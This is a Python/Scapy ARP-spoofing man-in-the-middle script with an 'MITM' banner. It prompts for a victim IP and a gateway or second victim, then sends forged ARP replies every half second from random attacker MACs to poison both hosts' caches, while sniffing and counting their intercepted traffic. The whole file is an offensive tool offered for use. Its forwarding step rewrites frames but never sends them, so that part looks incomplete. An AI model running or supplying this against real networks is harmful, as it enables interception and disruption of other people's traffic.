#!/usr/bin/env python3
#Created by PepeBigotes

from scapy.all import *
from time import sleep
import os



os.system('cls' if os.name=='nt' else 'clear')
print("""
 ███╗   ███╗██╗████████╗███╗   ███╗
 ████╗ ████║██║╚══██╔══╝████╗ ████║
 ██╔████╔██║██║   ██║   ██╔████╔██║
 ██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║
 ██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║
 ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝
 """)



def get_mac_from_ip(i_ip):
    fake_mac = RandMAC()
    foo = '.'.join(i_ip.split('.')[0:3]) + '.0/24'
    fake_ip = str(RandIP(foo))
    fake_ip = IP(src=fake_ip).src
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') /\
          ARP(op=1, pdst=i_ip)
    ans = srp1(pkt, timeout=3, retry=-2, verbose=0)
    if not ans: return None
    return ans[ARP].hwsrc


def try_get_mac(ip):
    cached_mac = getmacbyip(ip) # Scapy's func to check ARP cache
    if cached_mac: return cached_mac
    else: mac = get_mac_from_ip(ip) # Send ARP request packet
    if not mac: print(f"[!] Could not get MAC of {ip}"); exit()
    return mac



try:
    TRG_IP = input("Target IP: ") # Target host (Victim)
    TRG_MAC = try_get_mac(TRG_IP)
    print(f"Found target MAC: {TRG_MAC}")
    dst_ip = input("Destination IP (leave blank for default GW): ") # Destination host (GateWay / 2nd Victim)
    if dst_ip == '': DST_IP = conf.route.route('0.0.0.0')[2]
    else: DST_IP = dst_ip
    DST_MAC = try_get_mac(DST_IP)
    print(f"Found destination MAC: {DST_MAC}")
    T_SRC_MAC = str(RandMAC()) # Fake macs for the attacker
    D_SRC_MAC = str(RandMAC())
    print(f"\nRunning MAC {T_SRC_MAC} for {TRG_IP}")
    print(f"Running MAC {D_SRC_MAC} for {DST_IP}")
except KeyboardInterrupt:
    print("\nKeyboardInterrupt")
    exit()


pkts_from_trg = 0
pkts_from_dst = 0
pkts_count = 0



def handle_arp(pkt):
    if not pkt.haslayer(ARP): print("[!] Attempted to run handle_arp() on a non-ARP packet"); return
    if pkt[0].src == TRG_MAC and pkt[ARP].pdst == DST_IP: # TRG looking for DST
        global pkts_from_trg; pkts_from_trg += 1
        pkt = Ether(src=D_SRC_MAC, dst=pkt[0].src) /\
              ARP(op=2, hwsrc=D_SRC_MAC, psrc=DST_IP, hwdst=pkt[0].src, pdst=TRG_IP)

    if pkt[0].src == DST_MAC and pkt[ARP].pdst == TRG_IP: # DST looking for TRG
        global pkts_from_dst; pkts_from_dst += 1
        pkt = Ether(src=T_SRC_MAC, dst=pkt[0].src) /\
              ARP(op=2, hwsrc=T_SRC_MAC, psrc=TRG_IP, hwdst=pkt[0].src, pdst=DST_IP)

    sendp(pkt, verbose=0)


def handle_pkt(pkt):
    global pkts_count; pkts_count += 1
    #if not pkt.haslayer(Ether): print("[!] Packet has no Ether layer\n");pkt.show(); return
    if pkt[0].src not in (TRG_MAC, DST_MAC): return
    if pkt.haslayer(ARP): handle_arp(pkt); return

    if pkt[0].src == TRG_MAC and pkt[0].dst == T_SRC_MAC:
        global pkts_from_trg; pkts_from_trg += 1
        pkt[0].src = D_SRC_MAC
        pkt[0].dst = DST_MAC

    if pkt[0].src == DST_MAC and pkt[0].dst == D_SRC_MAC:
        global pkts_from_dst; pkts_from_dst += 1
        pkt[0].src = T_SRC_MAC
        pkt[0].dst = TRG_MAC



sniffer = AsyncSniffer(store=0, prn=handle_pkt)
sniffer.start()


pkt1 = Ether(src=D_SRC_MAC, dst=DST_MAC) /\
        ARP(op=2, hwsrc=D_SRC_MAC, psrc=TRG_IP, hwdst=DST_MAC, pdst=DST_IP)
pkt2 = Ether(src=T_SRC_MAC, dst=TRG_MAC) /\
        ARP(op=2, hwsrc=T_SRC_MAC, psrc=DST_IP, hwdst=TRG_MAC, pdst=TRG_IP)


try:
    while True:
        sendp(pkt1, verbose=0)
        sendp(pkt2, verbose=0)
        print(f"Total {pkts_count}| {pkts_from_trg} from {TRG_IP} | {pkts_from_dst} from {DST_IP}", end='\r')
        sleep(0.5)
except KeyboardInterrupt:
    print("\nKeyboardInterrupt")
    sniffer.stop()
    print(f"Got a total of {pkts_from_trg} packets from {TRG_IP} (Target)")
    print(f"And a total of {pkts_from_dst} packets from {DST_IP} (Destination)")
    exit()